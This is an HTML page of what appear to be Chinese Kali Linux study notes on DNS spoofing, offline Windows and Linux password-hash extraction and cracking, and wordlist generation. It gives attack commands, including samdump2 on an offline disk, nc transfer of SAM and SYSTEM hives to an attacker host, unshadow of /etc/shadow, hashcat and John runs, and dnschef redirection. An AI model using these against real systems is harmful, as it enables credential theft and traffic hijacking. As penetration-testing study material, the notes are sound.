<li><strong><code>🔺命令：vi /usr/lib/x86_64-linux-gnu/</code></strong>dnsspoof.hosts（侦听目标机器53端口）</li>
<li>192.168.1.1 → *.taobao.com</li>
<li>Win7访问<a href="http://www.taobao.com（发生重定向）" target="_blank" rel="noopener">www.taobao.com（发生重定向）</a></li>
<li>▲ 2020.1.27 dnsspoof无法进行重定向，无法达到DNS欺骗的目的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）"><a href="#4-DNS代理欺骗（Kali-→-Win7，实现流量的重定向）" class="headerlink" title="4. DNS代理欺骗（Kali → Win7，实现流量的重定向）"></a>4. DNS代理欺骗（Kali → Win7，实现流量的重定向）</h4><ul>
<li>前提：有能力修改客户端的网络参数的配置（DNS/Host修改配置）</li>
<li>dnschef<ul>
<li>–fakeip（欺骗解析到的IP地址）</li>
<li>–fakedomains（伪造欺骗的域名）</li>
<li>–interface（进行网卡欺骗的动作，DNS侦听动作）</li>
</ul>
</li>
<li><strong><code>🔺命令：dnschef --fakeip=1.1.1.10 --fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2（Kali主机IP）-q</code></strong></li>
<li>将被害者DNS指向伪造的DNS服务器（Win7修改DNS服务器）</li>
<li>Win7和Kali进行抓包比对</li>
<li>ping一个没有欺骗的域名看是否正常运作</li>
<li>▲ 2020.1.27可进行正常运行，也能截获到数据包，但无法进行重定向</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%80)%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十一)：离线密码破解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-26T22:35:12+08:00">
                2020-01-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-离线密码破解"><a href="#1-离线密码破解" class="headerlink" title="1. 离线密码破解"></a>1. 离线密码破解</h4><ul>
<li>身份认证<ul>
<li>禁止明文传输密码（存在大的安全问题）</li>
<li>每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</li>
<li>服务器端用户数据应加严加密保存</li>
<li>服务器端保存用户密码的哈希值（进行哈希值匹配）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐哈希算法是单向算法，逆向碰撞在数学上是存在不可行性，只能通过碰撞去破解</code></pre></blockquote>
<ul>
<li>破解思路<ul>
<li>嗅探获取密码HASH</li>
<li>利用漏洞登陆服务器并从用户数据库获取HASH</li>
<li>识别HASH类型（长度、字符集）</li>
<li>利用离线破解工具碰撞密码HASH</li>
</ul>
</li>
<li>优势<ul>
<li>离线不会触发密码锁定机制</li>
<li>不会产生大量登陆失败日志引起管理员注意</li>
</ul>
</li>
<li>HASH识别工具<ul>
<li>hash-identifier</li>
<li>Hashid</li>
<li>▲ 可能识别错误或无法识别</li>
<li>安装浏览器插件：hashr ▲ 2020.1.25无法找到hashr插件</li>
</ul>
</li>
<li><strong><code>🔺命令：hash-identifier</code></strong><ul>
<li>直接贴入hash值</li>
</ul>
</li>
<li><strong><code>🔺命令：hashid hash值</code></strong></li>
</ul>
<h4 id="2-Windows-HASH获取–已有登陆账号（Win7）"><a href="#2-Windows-HASH获取–已有登陆账号（Win7）" class="headerlink" title="2. Windows HASH获取–已有登陆账号（Win7）"></a>2. Windows HASH获取–已有登陆账号（Win7）</h4><ul>
<li>SAM数据库，身份提权等   </li>
<li>利用漏洞：Pwdump、fgdump、 mimikatz、wce </li>
</ul>
<h4 id="3-Windows-HASH获取–未有登陆账号（Win7）"><a href="#3-Windows-HASH获取–未有登陆账号（Win7）" class="headerlink" title="3. Windows HASH获取–未有登陆账号（Win7）"></a>3. Windows HASH获取–未有登陆账号（Win7）</h4><ul>
<li>物理接触：samdump2</li>
<li>插入一张Kali ISO 启动虚拟机，用Kali启动电脑，进入Live模式</li>
<li><strong><code>🔺命令：fdisk -l</code></strong>（查看本地硬盘）</li>
<li><strong><code>🔺命令：mount /dev/sda1 /mdedia</code></strong>（小容量分区，引导文件）</li>
<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong>（大容量分区，操作系统文件）</li>
<li><strong><code>🔺命令：ls /mnt</code></strong>（存在windows目录）</li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong><ul>
<li>SYSTEM目录保存一个密钥，用于加密SAM数据库，默认不设置，设置后需输入两次密码 </li>
</ul>
</li>
<li><strong><code>🔺命令：samdump2 SYSTEM SAM -o sam.hash</code></strong><ul>
<li>Win7/Win8默认禁用Administrator/Guest账号，需要手动右键运行</li>
<li>Win7/Win8废弃LMHash，只用NTLMHash</li>
</ul>
</li>
<li>利用nc传输HASH<ul>
<li><strong><code>🔺命令：nc -nvlp 3333</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 3333</code></strong>（Window上的Kali）</li>
</ul>
</li>
</ul>
<h4 id="4-Hashcat"><a href="#4-Hashcat" class="headerlink" title="4. Hashcat"></a>4. Hashcat</h4><ul>
<li>开源多线程密码破解工具 </li>
<li>支持80多种加密算法破解</li>
<li>基于CPU的计算能力破解</li>
<li>支持通配符，模式（hashcat -h）</li>
<li>常用参数/命令<ul>
<li>-m（hash值的类型）<ul>
<li><strong><code>🔺命令：echo 哈希值 sam.hash</code></strong></li>
<li><strong><code>🔺命令：hashcat -m 1000 sam.hash pass.lst</code></strong>（NTLM）</li>
<li><strong><code>🔺命令：hashcat -m 100 hash.dump pass.lst</code></strong>（SHA-1）</li>
<li><strong><code>🔺命令：hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d</code></strong>（MD5）</li>
</ul>
</li>
<li>-a（选用字典的模式）</li>
<li>-b（测试当前机器CPU计算能力）</li>
<li><strong><code>🔺命令：hashcat -m 100 -a 3 hash -i --increment-min（增量） 6 --increment-max 8 ?l?l?l?l?l?l?l?l</code></strong> </li>
</ul>
</li>
<li>通配符<ul>
<li>?l = abcdefghijklmnopqrstuvwxyz </li>
<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
<li>?d = 0123456789 </li>
<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
<li>?a = ?l?u?d?s </li>
<li>?b = 0x00 - 0xff</li>
</ul>
</li>
<li>六种模式 <ul>
<li>0 Straight：字典破解 </li>
<li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21） </li>
<li>2 Toggle case：尝试字典中所有密码的大小写字母组合 </li>
<li>3 Brute force：指定字符集（或全部字符集）所有组合 </li>
<li>4 Permutation：字典中密码的全部字符置换组合（12 21） </li>
<li>5 Table-lookup：程序为字典中所有密码自动生成掩码</li>
</ul>
</li>
<li>▲ 2020.1.26This device’s constant buffer size is too small/This device’s local mem size is too small猜测需要用到显卡GPU</li>
<li>▲ 2020.1.26从hashcat 3.30开始，在虚拟机中运行hashcat经常会报错，提示GPU错误。这是由于从该版本开始，hashcat对于Intel CPU会自动检测Intel OpenCL运行时，即是否支持GPU破解。如果不支持，就会停止运行。还有需要缓存足够，用户可添加隐藏选项–force来强制运行，也不一定好使。</li>
<li>▲ 2020.1.26在物理机上可以正常使用</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=a3a1s41srxGRQ28Vf-m3XnK9v0MSIZAVrmgjNT26LcpW1tUME3MHOoSRrkVm82w8LY5F_jyX9hZLQQAMqN8Clbu4Lk8m_1iuHiT_3edmWE00qDaUJmPHAQ&file_name=/hashcat.PNG" alt="hashcat使用"></p>
<h4 id="5-Syskey（Window的操作系统工具）"><a href="#5-Syskey（Window的操作系统工具）" class="headerlink" title="5. Syskey（Window的操作系统工具）"></a>5. Syskey（Window的操作系统工具）</h4><ul>
<li>使用Bootkey利用RC4算法加密SAM数据库<ul>
<li>Win+R → syskey</li>
<li>设置Bootkey</li>
<li>在软盘上保存启动密码/在本机上保存启动密码</li>
<li>尝试破解Bootkey加密后的密码（两次密码不对应，也难以破解）</li>
</ul>
</li>
<li>Bootkey保存于SYSTEM文件中 </li>
<li>Bkhive <ul>
<li>从SYSTEM文件中提取bootkey </li>
<li>Kali 2.0 抛弃了bkhive（工具已经长期不更新，安装过程问题也较多）</li>
<li>编译安装：<a href="http://http.us.debian.org/debian/pool/main/b/bkhive/" target="_blank" rel="noopener">http://http.us.debian.org/debian/pool/main/b/bkhive/</a><ul>
<li>下载tar.gz的源码包（bkhive_1.1.1.orig.tar.gz）</li>
<li><strong><code>🔺命令：tar -zxvf *.tar.gz</code></strong></li>
<li><strong><code>🔺命令：cd bkhive</code></strong></li>
<li><strong><code>🔺命令：make</code></strong></li>
<li><strong><code>🔺命令：make install</code></strong> </li>
<li><strong><code>🔺命令：apt-get -f install</code></strong></li>
<li><strong><code>🔺命令：apt-get purge samdump2</code></strong>（卸载高版本的samdump）</li>
<li><strong><code>🔺命令：apt-get install libssl-dev</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：nc -nvlp 333 &gt; SYSTEM</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 333 &lt; SYSTEM -q 1</code></strong>（Window上的Kali）</li>
<li><strong><code>🔺命令：nc -nvlp 333 &gt; SAM</code></strong>（攻击者的Kali）</li>
<li><strong><code>🔺命令：nc IP地址 333 &lt; SAM -q 1</code></strong>（Window上的Kali）</li>
<li><strong><code>🔺命令：bkhive SYSTEM key</code></strong> </li>
<li><strong><code>🔺命令：samdump2 SAM key</code></strong>（版本已更新，不再支持此功能）</li>
</ul>
</li>
<li>建议使用 Kali 1.x（Kali 1.1版本可以实现）▲ 2020.1.26暂无可靠的Kali 1.x版本</li>
</ul>
<h4 id="6-Oclhashcat"><a href="#6-Oclhashcat" class="headerlink" title="6. Oclhashcat"></a>6. Oclhashcat</h4><ul>
<li>号称世界上最快、唯一的基于GPGPU的密码破解软件 </li>
<li>免费开源、支持多平台、支持分布式、150+hash算法</li>
<li>硬件支持<ul>
<li>虚拟机中无法使用 </li>
<li>支持CUDA技术的Nvidia显卡 </li>
<li>支持OpenCL技术的AMD显卡 </li>
<li>安装相应的驱动</li>
</ul>
</li>
<li>限制<ul>
<li>最大密码长度55字符 </li>
<li>使用Unicode的最大密码长度27字符</li>
</ul>
</li>
<li>关于版本<ul>
<li>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</li>
<li>▲ 2020.1.26 Kali机子上只有hashcat，只支持有GPU的密码破解</li>
</ul>
</li>
<li>命令<ul>
<li><strong><code>🔺命令：oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</code></strong></li>
</ul>
</li>
<li>通配符<ul>
<li>?l = abcdefghijklmnopqrstuvwxyz </li>
<li>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ </li>
<li>?d = 0123456789 </li>
<li>?s =  !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ </li>
<li>?a = ?l?u?d?s </li>
<li>?b = 0x00 - 0xff</li>
</ul>
</li>
</ul>
<h4 id="7-RainbowCrack"><a href="#7-RainbowCrack" class="headerlink" title="7. RainbowCrack"></a>7. RainbowCrack</h4><ul>
<li>基于时间记忆权衡技术生成彩虹表（保存计算好的密码字典）</li>
<li>提前计算密码的HASH值，通过比对HASH值破解密码</li>
<li>计算HASH的速度很慢，修改版支持CUDA GPU <ul>
<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
</ul>
</li>
<li>KALI中包含RainbiwCrack工具<ul>
<li>rtgen：预计算，生成彩虹表，耗时的阶段 </li>
<li>rtsort：对rtgen生成的彩虹表进行排序 </li>
<li>rcrack：查找彩虹表破解密码 </li>
<li>以上命令必须顺序使用</li>
</ul>
</li>
<li>彩虹表 <ul>
<li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li>
</ul>
</li>
<li>下载彩虹表<ul>
<li><a href="https://www.freerainbowtables.com/en/download/" target="_blank" rel="noopener">https://www.freerainbowtables.com/en/download/</a></li>
<li><a href="http://rainbowtables.shmoo.com/" target="_blank" rel="noopener">http://rainbowtables.shmoo.com/</a></li>
</ul>
</li>
<li>生成彩虹表–rtgen <ul>
<li>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160 </li>
<li><strong><code>🔺命令：rtgen md5 loweralpha（使用的字符集） 1（最小长度） 5（最大长度） 0（表索引） 10000 10000 0</code></strong> </li>
<li>计算彩虹表时间可能很长</li>
</ul>
</li>
<li>彩虹表排序–rtsort<ul>
<li><strong><code>🔺命令：cd /usr/share/rainbowcrack</code></strong> </li>
<li><strong><code>🔺命令：rtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></strong></li>
</ul>
</li>
<li>密码破解–rcrack<ul>
<li><strong><code>🔺命令：rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592</code></strong> </li>
<li><strong><code>🔺命令：rcrack *.rt -l hash.txt</code></strong></li>
</ul>
</li>
<li>▲ 2020.1.26自生成的彩虹表无法被找到</li>
</ul>
<h4 id="8-John"><a href="#8-John" class="headerlink" title="8. John"></a>8. John</h4><ul>
<li>支持众多服务应用的加密破解 <ul>
<li><strong><code>🔺命令：john --list=formats</code></strong></li>
</ul>
</li>
<li>支持某些对称加密算法破解</li>
<li>模式 <ul>
<li>Wordlist：基于规则的字典破解 </li>
<li>Single crack：默认被首先执行，使用Login/GECOS信息尝试破解 </li>
<li>Incremental：所有或指定字符集的暴力破解 </li>
<li>External：需要在主配配文件中用C语言子集编程</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐hashcat不支持对称加密算法的破解/john支持单向，对称，非对称加密算法破解
⭐用户信息（GECOS信息，包括名字，电话等，在/etc/passwd中）
1./etc/passwd存放账号的信息，/etc/shadow存放账号的密码信息
2./bin/false → 不可用此账号登陆，/bin/bash → 可用此账号登陆
⭐chin（可对用户GECOS信息进行修改）</code></pre></blockquote>
<ul>
<li>默认破解模式 <ul>
<li>Single、wordlist、incremental（按顺序尝试三种模式）</li>
<li>主配置文件中指定默认wordlist</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐[Options]（/etc/john/john.conf）
#Default wordlist file name (including in batch mode)
Wordlist=$JOHN/password.lst</code></pre></blockquote>
<ul>
<li>破解Linux系统账号密码 <ul>
<li><strong><code>🔺命令：unshadow /etc/passwd /etc/shadow &gt; pass.txt</code></strong>（用户名密码文件的合并）</li>
<li><strong><code>🔺命令：john pass.txt</code></strong> </li>
<li><strong><code>🔺命令：john --show</code></strong> （密码保存在文件下）</li>
<li>(.john）john.pot–密码保存/john.log–日志文件/john.rec–破解过程信息</li>
</ul>
</li>
<li>破解windows密码 <ul>
<li><strong><code>🔺命令：john sam.hash --wordlist=password.lst --format=nt</code></strong> </li>
<li><strong><code>🔺命令：john sam.hash --format=nt --show</code></strong></li>
</ul>
</li>
<li>Johnny图形化界面的John</li>
</ul>
<h4 id="9-Ophcrack（图形化界面）"><a href="#9-Ophcrack（图形化界面）" class="headerlink" title="9. Ophcrack（图形化界面）"></a>9. Ophcrack（图形化界面）</h4><ul>
<li>基于彩虹表的LM、NTLM密码破解软件</li>
<li>需要Load一个彩虹表，安装解压后的文件（官方网站下载彩虹表）</li>
<li>彩虹表：<a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/tables.php</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/" itemprop="url">Kali Linux笔记(五十九)：密码破解--身份认证、字典</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:29+08:00">
                2020-01-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><ul>
<li>目标系统实施了强安全措施<ul>
<li>安装了所有补丁</li>
<li>无任何已知漏洞</li>
<li>无应用层漏洞</li>
<li>攻击面最小化（端口最小化，利用化）</li>
</ul>
</li>
<li>社会工程学</li>
<li>获取目标系统用户身份<ul>
<li>非授权用户不受信，认证用户可以访问守信资源</li>
<li>已有用户账号权限受限，需要提权</li>
<li>不会触发系统报警（非上传木马，用正常管理员登陆）</li>
</ul>
</li>
</ul>
<h4 id="2-身份认证方法"><a href="#2-身份认证方法" class="headerlink" title="2. 身份认证方法"></a>2. 身份认证方法</h4><ul>
<li>证明你是你声称你是的那个人<ul>
<li>你知道什么（账号密码、pin、passphrase）</li>
<li>你有什么（令牌、token、key、证书、密宝、手机）</li>
<li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别）</li>
<li>以上方法结合使用（多因素身份认证）</li>
</ul>
</li>
<li>基于互联网的身份认证仍以账号密码为主要形式</li>
</ul>
<h4 id="3-密码破解方法"><a href="#3-密码破解方法" class="headerlink" title="3. 密码破解方法"></a>3. 密码破解方法</h4><ul>
<li>人工猜解<ul>
<li>垃圾桶工程</li>
<li>被动信息收集</li>
</ul>
</li>
<li>基于字典暴力破解（主流）</li>
<li>键盘空间字符爆破</li>
<li>字典<ul>
<li>保存有用户和密码的文本文件</li>
<li>/usr/share/wordlist</li>
<li>/usr/share/wfuzz/wordlist</li>
<li>/usr/share/seclists</li>
<li>▲ rockyou.txt</li>
</ul>
</li>
</ul>
<h4 id="4-字典–Crunch"><a href="#4-字典–Crunch" class="headerlink" title="4. 字典–Crunch"></a>4. 字典–Crunch</h4><ul>
<li>键盘空间字符爆破<ul>
<li>全键盘空间字符</li>
<li>部分键盘空间字符（基于规则）</li>
<li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li>
</ul>
</li>
<li>crunch <min-len><max-len>[<charset string>][options]<ul>
<li><charset string>默认是小写字符</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></strong><ul>
<li>-b（按大小分割【kb/kib、mb/mib、gb/gib】）kb、mb、gb → 1000/kib、mib、gib → 1024</li>
<li>-c（每个字典的行数）</li>
<li>以上两个参数必须与-o START结合使用</li>
<li>-d（同一字符连贯出现数量【11/aaa】）</li>
</ul>
</li>
<li>字符集<ul>
<li><strong><code>🔺命令：cat /usr/share/crunch/charset.lst</code></strong></li>
<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></strong></li>
</ul>
</li>
<li>无重复字符集<ul>
<li><strong><code>🔺命令：crunch 1 1 -p（指定字符作为生成字符） 1234567890 | more</code></strong></li>
<li>必须是最后一个参数</li>
<li>最大、最小字符长度失效，但必须存在</li>
<li>与-s参数不兼容（-s指定起始字符串）</li>
<li><strong><code>🔺命令：crunch 4 4 0123456789 -s 9900</code></strong></li>
</ul>
</li>
<li>读取文件中每行内容作为基本字符生成字典<ul>
<li><strong><code>🔺命令：crunch 1 1 -q</code></strong> read（文件中每段简单设置为一个字符，然后进行拼接调换）</li>
<li>最小、最大字符长度失效，但必须存在</li>
<li>每段在生成的字典文件中，每行只出现一次（4行文件=4<em>3</em>2*1=24行字典）</li>
</ul>
</li>
<li>字典组成规则<ul>
<li><strong><code>🔺命令：crunch 6 6 -t @,%%^^ | more</code></strong></li>
<li>@：小写字母 lalpha</li>
<li>,：大写字母 ualpha</li>
<li>%：数字 numeric</li>
<li>^：符号 symbols</li>
</ul>
</li>
<li>输出文件压缩<ul>
<li><strong><code>🔺命令：crunch 4 4 -t @,%^ -o 1.txt -z 7z</code></strong></li>
<li>其他压缩格式：gzip、bzip2、lzma</li>
<li>-7z压缩比率最大</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 4 4 -f /usr/share/crunch/charset.lsb mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</code></strong>（@表示字符集所有组合，特殊情况）</li>
<li><strong><code>🔺命令：crunch 4 5 -p dog cat bird</code></strong>（后面三个词语是为三个基本字符）</li>
<li><strong><code>🔺命令：crunch 5 5 abc DEF + \!@# -t ,@^%,</code></strong> （从指定的字符中挑选）<ul>
<li><ul>
<li>占位符（表示所有）</li>
</ul>
</li>
<li>\ 转义符（空格、符号）</li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 5 5 -t ddd%% -p dog cat bird</code></strong><ul>
<li>任何不同于-p 参数指定的值都是占位符</li>
<li>d无效，不同于-p </li>
</ul>
</li>
<li><strong><code>🔺命令：crunch 5 5 -d 2@ -t @@@%%</code></strong>（小写字母不能超过两个连续相同）</li>
<li>组合应用（边生成边使用边丢弃）<ul>
<li><strong><code>🔺命令：crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –</code></strong></li>
<li><strong><code>🔺命令：crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</code></strong></li>
</ul>
</li>
</ul>
<h4 id="5-字典–CUPP"><a href="#5-字典–CUPP" class="headerlink" title="5. 字典–CUPP"></a>5. 字典–CUPP</h4><ul>
<li>按个人信息生成其专属的密码字典（适合破解个人信息的个人账号密码）</li>
<li>CUPP：Common User Password Profiler<ul>
<li><strong><code>🔺命令：git clone https://github.com/Mebus.cupp.git</code></strong></li>
<li><strong><code>🔺命令：python cupp.py -i</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-字典–cewl"><a href="#6-字典–cewl" class="headerlink" title="6. 字典–cewl"></a>6. 字典–cewl</h4><ul>
<li>通过收集网站信息生成字典</li>
<li><strong><code>🔺命令：cewl 1.1.1.1（或域名） -m 3 -d 3 -e -c -v -w a.txt</code></strong><ul>
<li>-m（最小单词长度）</li>
<li>-d（爬网深度）</li>
<li>-e（收集包含email地址信息）</li>
<li>-c（每个单词出现次数）</li>
<li>支持基本、摘要身份认证</li>
<li>支持代理</li>
</ul>
</li>
<li>用户密码变型<ul>
<li>基于cewl得结果进行密码变型</li>
<li>末尾增加数字串</li>
<li>字母大小写变化</li>
<li>字母与符号相互转换</li>
<li>字母与数字相互转换</li>
<li>P@$$w0ord</li>
</ul>
</li>
</ul>
<h4 id="7-字典–John-the-Ripper"><a href="#7-字典–John-the-Ripper" class="headerlink" title="7. 字典–John the Ripper"></a>7. 字典–John the Ripper</h4><ul>
<li>使用John the Ripper配置文件实现密码动态变型</li>
<li>/etc/john/john.conf<ul>
<li>[List.Rules:Wordlist]</li>
<li>$[0-9]$[0-9]$[0-9]</li>
<li><strong><code>🔺命令：cat a.txt | head -n 10 | cut -d &quot;,&quot; -f 1 &gt;  p.lst</code></strong>（a.txt为cewl生成的文件）</li>
<li><strong><code>🔺命令：john --wordlist=p.lst --rules --stdout &gt; m.txt</code></strong></li>
<li><strong><code>🔺命令：wc -l m.txt</code></strong>（查看m.txt里面有多少条记录）<br>– [List.Rules:test] $[0-9]$[0-9]$[0-9]$[a-zA-Z] $[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[<code>~!@#$%^&amp;*()\-_=+]
– **</code>🔺命令：john –wordlist=cewl.txt –rules=test –stdout &gt; m.txt<code>**
– **</code>🔺命令：john –wordlist=ahm.lst –rules=test HASHFILE`**</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url">Kali Linux笔记(六十)：在线密码破解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:23+08:00">
                2020-01-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
